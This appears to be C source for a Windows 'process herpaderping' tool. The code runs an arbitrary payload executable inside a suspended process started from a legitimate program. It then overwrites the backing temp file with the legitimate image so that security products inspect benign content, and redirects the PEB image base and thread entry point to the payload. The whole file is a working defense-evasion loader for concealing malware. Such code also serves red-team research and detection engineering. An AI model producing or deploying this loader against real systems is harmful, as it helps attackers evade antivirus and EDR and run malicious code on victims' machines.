# include <stdio.h>
# include <winternl.h>
# include "definitions.h"

# define MSG( msg, ... ) \
	printf( "[+] " msg "\n", ##__VA_ARGS__ )

# define PUTS( msg, ... ) \
	printf( "[-] " msg "\n", ##__VA_ARGS__ ); \
	return -1;

# define PUTS2( msg, ... ) \
	printf( "[-] " msg "\n", ##__VA_ARGS__ ); \
	goto Cleanup;
	
# define API_FPUTS( api, msg, ... ) \
	printf( "[-] " api " failed with error: %d\n\tMSG > " msg "\n", GetLastError(), ##__VA_ARGS__ ); \
	goto Cleanup

# define NT_PUTS( api, msg, ... ) \
	printf( "[-] " api " failed with error: 0x%0.8X\n\tMSG > " msg "\n", Status, ##__VA_ARGS__ ); \
	goto Cleanup

void* ReadToBuffer( char* Filepath, size_t* size )
{
	void *hFile = 0;
	char *pFilebuffer = 0;
	unsigned long BytesRead = 0;
	size_t Filesize = 0;

	if ( ( hFile = CreateFileA( Filepath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ) ) == INVALID_HANDLE_VALUE )
	{
		printf( "(CreateFileA) Could not open handle to %s.", Filepath );
		return NULL;
	}

	Filesize = ( SIZE_T )GetFileSize( hFile	, 0 );

	if ( ( pFilebuffer = VirtualAlloc( 0, Filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) == NULL )
	{
		printf( "(VirtualAlloc) Could not allocate buffer for the file" );
		return NULL;
	}

	if ( !ReadFile( hFile, pFilebuffer, ( DWORD )Filesize, &BytesRead, 0 ) )
	{
		printf( "(ReadFile) Could not read file into buffer at 0x%p", pFilebuffer );
		return NULL;
	}

	*size = Filesize;
	return pFilebuffer;
}

int main( int argc, char* argv[] )
{

	char *PathToLegitimateExe	= 0,
		 *PathToPayloadExe		= 0,
		  TmpPath[ MAX_PATH ]	= { 0 },
		  TmpName[ MAX_PATH ]	= { 0 };

	void *hPayload				= 0,
		 *hSection				= 0,
		 *hTemp					= 0,
		 *hModule				= 0,
		 *pMappedPayload		= 0,
		 *pRawPayload			= 0,
		 *pLegitimateExe		= 0;

	size_t			PayloadSize			= 0,
					LegitimateExeSize	= 0;

	unsigned long	BytesRead			= 0,
					BytesWritten		= 0;

	STARTUPINFOA		StartupInfo			= { 0 };
	PROCESS_INFORMATION HerpaderpedProcess	= { 0 };
	CONTEXT				Ctx					= { 0 };
	PIMAGE_NT_HEADERS   NtHeaders			= 0;
	NTSTATUS			Status				= 0;


	if ( argc != 3 )
	{
		printf( "USAGE: %s <path/to/legitimate/exe> <path/to/payload/exe>", argv[0] );
		return -1;
	}

	PathToLegitimateExe = argv[ 1 ];
	PathToPayloadExe = argv[ 2 ];

	hModule = GetModuleHandleA( "ntdll.dll" );
	fpNtCreateSection NtCreateSection = ( fpNtCreateSection )GetProcAddress( hModule, "NtCreateSection" );
	fpNtMapViewOfSection NtMapViewOfSection = ( fpNtMapViewOfSection )GetProcAddress( hModule, "NtMapViewOfSection" );
	fpNtUnmapViewOfSection NtUnmapViewOfSection = ( fpNtUnmapViewOfSection )GetProcAddress( hModule, "NtUnmapViewOfSection" );

	/*
		Step 1: Get the content of the executable payload
	*/
	if ( ( pRawPayload = ReadToBuffer( PathToPayloadExe, &PayloadSize ) ) == NULL )
	{
		PUTS2( "Failed to read payload!" );
	}
	NtHeaders = ( PIMAGE_NT_HEADERS )( ( unsigned long long )pRawPayload + ( ( PIMAGE_DOS_HEADER )pRawPayload )->e_lfanew );
	if ( NtHeaders->Signature != IMAGE_NT_SIGNATURE )
	{
		PUTS2( "NtHeader mismatch. Payload does not appear to be executable." );
	}

	MSG( "Read contents of %s to buffer at 0x%p", PathToPayloadExe, pRawPayload );

	/*
		Step 2: Create a temporary file to hold the payload
	*/
	if ( GetTempPathA( MAX_PATH, TmpPath ) == 0 || GetTempFileNameA( TmpPath, "TMP", 0, TmpName ) == 0 )
	{
		API_FPUTS( "GetTempPathA or GetTempFileNameA", "Could not create temporary file." );
	}
	MSG( "Created temporary file at the path %s", TmpName );

	/*
		Step 3: Write the payload to the temp file
	*/
	hTemp = CreateFileA( TmpName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	if ( !WriteFile( hTemp, pRawPayload, ( DWORD )PayloadSize, &BytesWritten, 0 ) )
	{
		API_FPUTS( "WriteFile", "Could not write payload to temp file" );
	}
	MSG( "Wrote payload to temporary file" );

	/*
		Step 4: Create an image section in memory from the temporary payload file
	*/
	if ( ( Status = NtCreateSection( &hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, hTemp ) ) != 0x0 )
	{
		NT_PUTS( "NtCreateSection", "Could not create image section from temp file" );
	}

	/*
		Step 5: Create a suspended process from a legitimate image
	*/
	StartupInfo.cb = sizeof( STARTUPINFOA );
	if ( !CreateProcessA( PathToLegitimateExe, 0, 0, 0, 0, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 0, 0, &StartupInfo, &HerpaderpedProcess ) )
	{
		API_FPUTS( "CreateProcessA", "Could not spawn %s process", PathToLegitimateExe );
	}
	MSG( "Spawned target process %s (%d)", PathToLegitimateExe, HerpaderpedProcess.dwProcessId );
	
	/*
		Step x: Map herpaderped section to the target process
	*/
	PayloadSize = 0;
	if ( ( Status = NtMapViewOfSection( hSection, HerpaderpedProcess.hProcess, &pMappedPayload, 0, 0, 0, &PayloadSize, 2, 0, PAGE_READONLY ) ) != 0x0 )
	{
		NT_PUTS( "NtMapViewOfSection", "Could not map herpaderped section to %s (%d)", PathToLegitimateExe, HerpaderpedProcess.dwProcessId );
	}

	MSG( "Mapped herpaderped section to %s (%d) at 0x%p", PathToLegitimateExe, HerpaderpedProcess.dwProcessId, pMappedPayload );

	/*
		Step 6: Overwrite the temporary file with a legitimate image
	*/
	if ( ( pLegitimateExe = ReadToBuffer( PathToLegitimateExe, &LegitimateExeSize ) ) == NULL )
	{
		PUTS2( "(ReadToBuffer) Could not read %s", PathToLegitimateExe );
	}

	if ( !WriteFile( hTemp, pLegitimateExe, ( unsigned long )LegitimateExeSize, &BytesWritten, 0 ) )
	{
		API_FPUTS( "WriteFile", "Could not overwrite temporary file with legitimate file" );
	}
	MSG( "Overwrote temporary file with contents of %s", PathToLegitimateExe );

	/*
		Step 7: Patch image base address member of target process PEB with location of payload section.
			    ImageBaseAddress member of PEB is Reserved3 member + 1 pointers length (8 bytes) if using
				default PEB definition from Microsoft. RDX holds the base address of the peb in suspended
				process.
	*/
	Ctx.ContextFlags = CONTEXT_ALL;
	if ( !GetThreadContext( HerpaderpedProcess.hThread, &Ctx ) )
	{
		API_FPUTS( "GetThreadContext", "Could not get context of main thread in herpaderped process to retrieve PEB" );
	}
	if ( !WriteProcessMemory( HerpaderpedProcess.hProcess, ( ( PPEB )( Ctx.Rdx ) )->Reserved3 + 1, &pMappedPayload, sizeof( void* ), &BytesWritten ) )
	{
		API_FPUTS( "WriteProcessMemory", "Could not overwrite target process PEB image base address with base of payload" );
	}
	MSG( "Patched ImageBaseAddress member of PEB in %s (%d) with base of payload @ 0x%p", PathToLegitimateExe, HerpaderpedProcess.dwProcessId, pMappedPayload );
	

	/*
		Step 8: Set RCX register to entry point of payload. RCX holds the initial entry point of the payload.
	*/
	Ctx.Rcx = ( unsigned long long )pMappedPayload + NtHeaders->OptionalHeader.AddressOfEntryPoint; 
	if ( !SetThreadContext( HerpaderpedProcess.hThread, &Ctx ) )
	{
		API_FPUTS( "SetThreadContext", "Could not overwrite entry point of thread with payload entry point." );
	} 
	MSG( "Set RCX register to payload entry point: 0x%p", ( unsigned long long )pMappedPayload + NtHeaders->OptionalHeader.AddressOfEntryPoint );

	/*
		Step 9: Resume the thread to run the payload
	*/
	ResumeThread( HerpaderpedProcess.hThread );

	MSG( "Executed payload!" );

Cleanup:
	MSG( "Press enter to quit" );
	getchar();

	if ( hPayload )
		CloseHandle( hPayload );
	
	if ( pRawPayload )
		VirtualFree( pRawPayload, 0, MEM_RELEASE );

	if ( pLegitimateExe )
		VirtualFree( pLegitimateExe, 0, MEM_RELEASE );

	if ( hTemp )
		CloseHandle( hTemp );

	if ( TmpName )
		DeleteFileA( TmpName );

	if ( HerpaderpedProcess.hProcess )
		TerminateProcess( HerpaderpedProcess.hProcess, 0 );

	if ( hSection )
		CloseHandle( hSection );

	if ( pMappedPayload )
		NtUnmapViewOfSection( HerpaderpedProcess.hProcess, pMappedPayload );

	if ( hModule )
		CloseHandle( hModule );

	MSG( "Cleanly exited!" );

	return 0;

}